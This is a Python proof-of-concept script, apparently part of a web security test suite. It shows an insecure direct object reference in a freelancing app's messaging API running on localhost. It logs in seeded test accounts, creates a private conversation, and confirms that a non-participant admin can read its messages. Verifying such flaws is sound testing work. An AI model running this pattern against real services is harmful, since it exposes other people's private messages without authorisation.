"""
WSTG-ATHZ-04: Insecure Direct Object Reference — Conversation Access
Demonstrates that any authenticated user can read any conversation's messages,
even if they are not a participant in the conversation.
Expected: 200 response with conversation messages for a non-participant.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Login as client and freelancer
login_client = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testclient@hireflow.com",
    "password": "password123"
})
client_token = login_client.json()["token"]
client_id = login_client.json()["user"]["id"]

login_freelancer = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testfreelancer@hireflow.com",
    "password": "password123"
})
freelancer_token = login_freelancer.json()["token"]
freelancer_id = login_freelancer.json()["user"]["id"]

print(f"[+] Client: {client_id}")
print(f"[+] Freelancer: {freelancer_id}")

# Step 2: Create a private conversation between client and freelancer
conv = requests.post(f"{BASE}/api/messages/conversations", json={
    "participant_ids": [freelancer_id],
    "message": "This is a private message - IDOR test"
}, headers={"Authorization": f"Bearer {client_token}"})
conv_id = conv.json().get("id")
print(f"[+] Created conversation: {conv_id}")

# Step 3: Login as admin (NOT a participant)
login_admin = requests.post(f"{BASE}/api/auth/login", json={
    "email": "bob.admin@hireflow.com",
    "password": "password123"
})
admin_token = login_admin.json()["token"]
admin_id = login_admin.json()["user"]["id"]
print(f"[+] Admin (non-participant): {admin_id}")

# Step 4: Admin reads the private conversation
resp = requests.get(
    f"{BASE}/api/messages/conversations/{conv_id}",
    headers={"Authorization": f"Bearer {admin_token}"}
)

print(f"\n[+] Admin accessing private conversation...")
print(f"    Status: {resp.status_code}")
data = resp.json()
messages = data.get("messages", [])
print(f"    Messages found: {len(messages)}")
for msg in messages:
    print(f"    - [{msg.get('sender_id')[:8]}...] {msg.get('content')}")

assert resp.status_code == 200, f"Expected 200, got {resp.status_code}"
assert len(messages) > 0, "Expected messages in response"
print(f"\n[VULNERABLE] Conversation IDOR confirmed — admin (non-participant) can read private messages")
